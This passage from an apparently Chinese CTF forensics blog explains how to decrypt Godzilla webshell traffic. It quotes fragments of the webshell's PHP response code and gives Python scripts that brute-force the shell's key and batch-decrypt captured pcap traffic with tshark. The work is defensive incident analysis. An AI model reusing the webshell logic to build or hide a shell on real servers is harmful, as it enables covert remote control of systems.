</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>0</span><span class=p>,</span><span class=mi>16</span><span class=p>);</span> <span class=c1>// 输出MD5(连接密码+流量解密密钥)的前16位
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>encode</span><span class=p>(</span><span class=o>@</span><span class=nx>run</span><span class=p>(</span><span class=nv>$data</span><span class=p>),</span><span class=nv>$key</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>16</span><span class=p>);</span> <span class=c1>// 输出MD5(连接密码+流量解密密钥)的后16位
</span></span></span></code></pre></td></tr></table></div></div><p>因为连接密码可以从请求包中得到，就是请求包中POST传参的参数</p><p>因此，我们就可以尝试写一个脚本去爆破密钥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5_encode</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>crack_key</span><span class=p>(</span><span class=n>key_list</span><span class=p>,</span><span class=n>target_hash</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=s2>&#34;Antsword&#34;</span> <span class=c1># 哥斯拉的连接密码</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>key_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>md5_encode</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=c1># 明文密钥的MD5</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp_hash</span> <span class=o>=</span> <span class=n>md5_encode</span><span class=p>(</span><span class=n>pwd</span><span class=o>+</span><span class=n>tmp</span><span class=p>[:</span><span class=mi>16</span><span class=p>])</span> <span class=c1># 响应中返回的hash</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>tmp_hash</span> <span class=o>==</span> <span class=n>target_hash</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 密钥爆破成功: </span><span class=si>{</span><span class=n>key</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 用于解密哥斯拉流量的密钥为 </span><span class=si>{</span><span class=n>tmp</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>key</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 响应中返回的hash</span>
</span></span><span class=line><span class=cl>    <span class=n>target_hash</span> <span class=o>=</span> <span class=s2>&#34;e71f50e9773b23f9792dea3a7ae385ca&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;dic.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>key_list</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>crack_key</span><span class=p>(</span><span class=n>key_list</span><span class=p>,</span> <span class=n>target_hash</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># [+] 密钥爆破成功: Antsw0rd</span>
</span></span><span class=line><span class=cl><span class=c1># [+] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e</span></span></span></code></pre></td></tr></table></div></div><p>当然也可以直接用CTF-NetA爆破</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250515121809838.png alt=/posts/5422d65/imgs/image-20250515121809838.png height=980 width=1500></p><p>例题1-2024福建省数据安全大赛-gza_Cracker</p><p>例题2-2020HITCTF-Traffic</p><p>附：哥斯拉密钥爆破+流量批量解密脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>io</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gzip</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>url_decode</span><span class=p>(</span><span class=n>encoded_str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>encoded_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_decode</span><span class=p>(</span><span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>key</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=n>key</span><span class=p>[(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>15</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gunzip_bytes</span><span class=p>(</span><span class=n>compressed_data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>gzip</span><span class=o>.</span><span class=n>GzipFile</span><span class=p>(</span><span class=n>fileobj</span><span class=o>=</span><span class=n>io</span><span class=o>.</span><span class=n>BytesIO</span><span class=p>(</span><span class=n>compressed_data</span><span class=p>))</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_traffic</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>http_data</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>command</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;tshark&#34;</span><span class=p>,</span>  <span class=c1># tshark的路径，如果在环境变量里这里就不用改</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-r&#39;</span><span class=p>,</span> <span class=n>filename</span><span class=p>,</span>  <span class=c1># 读取指定的 pcapng 文件</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-Y&#39;</span><span class=p>,</span> <span class=s1>&#39;http&#39;</span><span class=p>,</span>  <span class=c1># 过滤出 HTTP 数据包</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-T&#39;</span><span class=p>,</span> <span class=s1>&#39;json&#39;</span><span class=p>,</span>  <span class=c1># 输出为 JSON 格式</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.file_data&#39;</span><span class=p>,</span>  <span class=c1># 请求中的文件数据（POST 请求的内容）</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.response.phrase&#39;</span><span class=p>,</span>  <span class=c1># 响应短语</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.content_type&#39;</span>  <span class=c1># 响应内容类型</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>command</span><span class=p>,</span> <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>json_output</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 遍历 JSON 数据并提取字段</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>packet</span> <span class=ow>in</span> <span class=n>json_output</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>layers</span> <span class=o>=</span> <span class=n>packet</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;_source&#39;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;layers&#39;</span><span class=p>,</span> <span class=p>{})</span>
</span></span><span class=line><span class=cl>        <span class=n>request_method</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.request.method&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>response_code</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.response.code&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>file_data</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.file_data&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>http_data</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>url_decode</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>file_data</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>http_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(item)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;Antsword=&#34;</span> <span class=ow>in</span> <span class=n>item</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>enc</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;Antsword=(.*)&#34;</span><span class=p>,</span><span class=n>item</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=c1># print(enc)</span>
</span></span><span class=line><span class=cl>                <span class=n>dec</span> <span class=o>=</span> <span class=n>xor_decode</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>enc</span><span class=p>),</span><span class=n>key</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>dec</span> <span class=o>=</span> <span class=n>gunzip_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span><span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 请求: </span><span class=si>{</span><span class=n>dec</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;e71f50e9773b23f9&#34;</span> <span class=ow>in</span> <span class=n>item</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>enc</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;e71f50e9773b23f9(.*)792dea3a7ae385ca&#34;</span><span class=p>,</span><span class=n>item</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>dec</span> <span class=o>=</span> <span class=n>xor_decode</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>enc</span><span class=p>),</span><span class=n>key</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>dec</span> <span class=o>=</span> <span class=n>gunzip_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span><span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 响应: </span><span class=si>{</span><span class=n>dec</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5_encode</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>crack_key</span><span class=p>(</span><span class=n>key_list</span><span class=p>,</span><span class=n>target_hash</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=s2>&#34;Antsword&#34;</span> <span class=c1># 哥斯拉的连接密码</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>key_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>md5_encode</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=c1># 明文密钥的MD5</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp_hash</span> <span class=o>=</span> <span class=n>md5_encode</span><span class=p>(</span><span class=n>pwd</span><span class=o>+</span><span class=n>tmp</span><span class=p>[:</span><span class=mi>16</span><span class=p>])</span> <span class=c1># 响应中返回的hash</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>tmp_hash</span> <span class=o>==</span> <span class=n>target_hash</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 密钥爆破成功: </span><span class=si>{</span><span class=n>key</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 用于解密哥斯拉流量的密钥为 </span><span class=si>{</span><span class=n>tmp</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>key</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 响应中返回的hash</span>
</span></span><span class=line><span class=cl>    <span class=c1># target_hash = &#34;e71f50e9773b23f9792dea3a7ae385ca&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># with open(&#34;dic.txt&#34;,&#39;r&#39;) as f:</span>
</span></span><span class=line><span class=cl>        <span class=c1># key_list = f.read().split()</span>
</span></span><span class=line><span class=cl>    <span class=c1># crack_key(key_list, target_hash)</span>
</span></span><span class=line><span class=cl>    <span class=c1># [+] 密钥爆破成功: Antsw0rd</span>
</span></span><span class=line><span class=cl>    <span class=c1># [+] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypt_traffic</span><span class=p>(</span><span class=s1>&#39;Crack_me.pcap&#39;</span><span class=p>,</span><span class=s1>&#39;a18551e65c48f51e&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h4 class=heading-element id=php_xor_raw><span>php_xor_raw</span>
<a href=#php_xor_raw class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>传输的数据类似于下图这种</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226141615204.png alt=/posts/5422d65/imgs/image-20250226141615204.png height=864 width=1306></p><p>因此我们直接对照着加密逻辑，CyberChef解密请求和响应即可（当然这里也可以写个脚本批量解）</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226141953586.png alt=/posts/5422d65/imgs/image-20250226141953586.png height=639 width=1919></p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226142116762.png alt=/posts/5422d65/imgs/image-20250226142116762.png height=988 width=1919></p><h4 class=heading-element id=php_xor_base64><span>php_xor_base64</span>
<a href=#php_xor_base64 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226142501601.png alt=/posts/5422d65/imgs/image-20250226142501601.png height=745 width=808></p><p>加密逻辑和上面的一样，就是多了一个URL解码和Base64解码的过程</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226142239379.png alt=/posts/5422d65/imgs/image-20250226142239379.png height=642 width=1917></p><p>然后响应的数据头尾会输出<code>md5(pass.key)</code>的前十六位和后十六位，解密的时候删去即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>0</span><span class=p>,</span><span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>encode</span><span class=p>(</span><span class=o>@</span><span class=nx>run</span><span class=p>(</span><span class=nv>$data</span><span class=p>),</span><span class=nv>$key</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>16</span><span class=p>);</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226142441765.png alt=/posts/5422d65/imgs/image-20250226142441765.png height=828 width=1919></p><h4 class=heading-element id=php_eval_xor_base64><span>php_eval_xor_base64</span>
<a href=#php_eval_xor_base64 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226142732540.png alt=/posts/5422d65/imgs/image-20250226142732540.png height=867 width=1190></p><p>这种情况下前面的数据<code>URL解码+reverse+Base64解码</code>后可以得到加密的key</p><p>然后执行的命令在第二个参数中，就是上图中的<code>babyshell</code></p><p>剩下的步骤就和之前一样了</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226143409529.png alt=/posts/5422d65/imgs/image-20250226143409529.png height=645 width=1917></p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226143429376.png alt=/posts/5422d65/imgs/image-20250226143429376.png height=607 width=1917></p><h3 class=heading-element id=冰蝎流量分析><span>冰蝎流量分析</span>
